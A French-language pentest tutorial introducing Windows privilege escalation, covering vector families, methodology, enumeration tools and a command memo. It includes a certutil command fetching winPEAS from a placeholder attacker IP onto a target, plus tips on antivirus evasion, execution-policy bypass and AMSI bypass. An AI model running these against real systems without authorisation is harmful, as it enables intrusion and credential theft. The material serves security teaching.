# Introduction a l'elevation de privileges Windows

L'elevation de privileges sous Windows est une etape determinante dans un pentest. Un acces initial en tant qu'utilisateur standard ne permet presque rien : pas d'acces aux hashes locaux, pas de controle sur les services, pas de lateral movement efficace. Passer de ce niveau limite a SYSTEM ou administrateur local ouvre la voie a l'extraction de credentials, au pivoting et a la compromission du domaine Active Directory.

## Pourquoi

En environnement professionnel, les postes Windows sont rarement configures de maniere ideale. Des logiciels tiers installes avec des permissions excessives, des services qui tournent en SYSTEM sans raison, des privileges dangereux attribues a des comptes de service, des GPO mal calibrees. Chaque ecart de configuration est une opportunite. Meme sur un systeme patche et supervise, il existe souvent au moins un vecteur exploitable parmi les dizaines de chemins possibles.

## Comment ca marche

### Surface d'attaque

L'escalade de privileges Windows repose sur plusieurs familles de vecteurs, chacune correspondant a un aspect du systeme.

| Famille | Exemples |
|---|---|
| **Privileges utilisateur** | SeImpersonate, SeDebugPrivilege, SeTakeOwnership, SeBackupPrivilege |
| **Groupes privilegies** | Backup Operators, DnsAdmins, Server Operators, Print Operators, Hyper-V Admins |
| **Permissions faibles** | ACL sur les binaires de service, services modifiables, chemins non quotes |
| **Services vulnerables** | Logiciels tiers avec RPC local en SYSTEM, DLL hijacking |
| **Credentials exposes** | Fichiers de config, historique PowerShell, unattend.xml, gestionnaires de mots de passe |
| **Kernel exploits** | MS17-010, HiveNightmare, PrintNightmare |
| **UAC bypass** | Contournement du User Account Control pour obtenir un token eleve |
| **Interaction utilisateur** | Capture de trafic, fichiers SCF sur partages, monitoring de commandes |

### Methodologie generale

L'approche suit un schema iteratif :

1. **Enumeration du systeme** : version de l'OS, niveau de patch, utilisateurs, groupes, privileges, services, processus, ports en ecoute
2. **Identification des vecteurs** : privileges dangereux, groupes privilegies, permissions faibles, services vulnerables
3. **Exploitation** : abus du vecteur identifie pour obtenir un shell SYSTEM ou ajouter le compte au groupe administrateurs local
4. **Post-exploitation** : extraction des credentials (SAM, LSASS, DPAPI), pivoting

{% hint style="info" %}
L'enumeration est la phase la plus importante. Un outil comme winPEAS couvre des centaines de verifications en quelques secondes, mais il faut savoir interpreter les resultats et verifier manuellement les faux positifs.
{% endhint %}

### Outils d'enumeration

| Outil | Type | Usage |
|---|---|---|
| **winPEAS** | Script (exe/bat) | Enumeration automatique complete, couvre privileges, services, fichiers, credentials |
| **Seatbelt** | C# (.NET) | Verifications de securite ciblees (equivalent de LinPEAS cote securite defensive) |
| **PowerUp** | PowerShell | Detection de mauvaises configurations de services et permissions |
| **SharpUp** | C# (.NET) | Version compilee de PowerUp, plus discrete |
| **JAWS** | PowerShell | Enumeration legere, bonne alternative si les autres sont bloques |
| **SessionGopher** | PowerShell | Extraction de sessions sauvegardees (PuTTY, WinSCP, RDP) |
| **Watson** | C# (.NET) | Detection de KB manquants pour les CVE connues |
| **WES-NG** | Python (attaquant) | Analyse du `systeminfo` hors ligne pour suggerer des exploits |
| **Sherlock** | PowerShell | Detection de vulnerabilites connues (legacy, pre-Watson) |

{% hint style="success" %}
En pratique, lancer winPEAS en premier donne une vue d'ensemble rapide. Ensuite, approfondir manuellement les pistes identifiees. Pour les systemes legacy (Server 2008, Windows 7), Sherlock et WES-NG sont particulierement utiles.
{% endhint %}

## En pratique

### Enumeration rapide avec winPEAS

```powershell
# - Transferer winPEAS sur la cible
certutil.exe -urlcache -split -f http://<IP_ATTAQUANT>/winPEASx64.exe C:\Temp\winPEAS.exe

# - Executer avec toutes les verifications
C:\Temp\winPEAS.exe quiet servicesinfo

# - Les resultats en rouge/jaune sont les trouvailles critiques
# Chercher en priorite :
# - Services modifiables
# - Privileges dangereux (SeImpersonate, SeDebug)
# - Fichiers de credentials
# - Chemins non quotes
```

### Enumeration avec PowerUp

```powershell
# - Charger et executer PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Resultats typiques :
# [*] Checking for modifiable services...
# [*] Checking for unquoted service paths...
# [*] Checking for modifiable service executables...
# [*] Checking %PATH% for modifiable locations...
```

### Analyse hors ligne avec WES-NG

```bash
# - Sur la cible, capturer les infos systeme
systeminfo > systeminfo.txt

# - Sur la machine attaquante, analyser
python3 wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only

# WES-NG compare le niveau de patch avec la base Microsoft
# et suggere les exploits applicables
```

### Enumeration avec Seatbelt

```powershell
# - Verifications de securite ciblees
.\Seatbelt.exe -group=all

# - Verifications specifiques
.\Seatbelt.exe TokenPrivileges WindowsAutoLogon SavedRDPConnections

# Seatbelt donne des resultats structures par categorie
```

## Pieges et galeres

- **winPEAS bloque par l'antivirus** : utiliser la version `.bat` ou `.ps1` qui est moins detectee que l'executable compile. Sinon, effectuer les verifications manuellement
- **Execution de scripts PowerShell restreinte** : contourner avec `powershell -ep bypass` ou `Set-ExecutionPolicy Bypass -Scope Process`
- **Faux positifs** : les outils automatises signalent beaucoup de resultats. Un chemin non quote n'est exploitable que si on peut ecrire dans un des repertoires intermediaires. Toujours verifier manuellement
- **Environnement restreint** : sur certains postes durcis (AppLocker, Constrained Language Mode), les outils classiques ne fonctionnent pas. Privilegier les binaires .NET ou les LOLBins
- **AMSI** : l'Anti-Malware Scan Interface bloque les scripts malveillants en memoire. Des techniques de bypass existent mais evoluent rapidement

## Memo express

| Outil / Commande | Usage |
|---|---|
| `winPEASx64.exe quiet` | Enumeration automatique complete |
| `Import-Module .\PowerUp.ps1; Invoke-AllChecks` | Detection de mauvaises configurations |
| `.\Seatbelt.exe -group=all` | Verifications de securite |
| `python3 wes.py systeminfo.txt` | Analyse de patch hors ligne |
| `whoami /priv` | Privileges du token courant |
| `whoami /groups` | Groupes de l'utilisateur courant |
| `net localgroup administrators` | Membres du groupe administrateurs |
| `systeminfo` | Informations systeme et niveau de patch |
| `wmic qfe list brief` | Liste des correctifs installes |

***
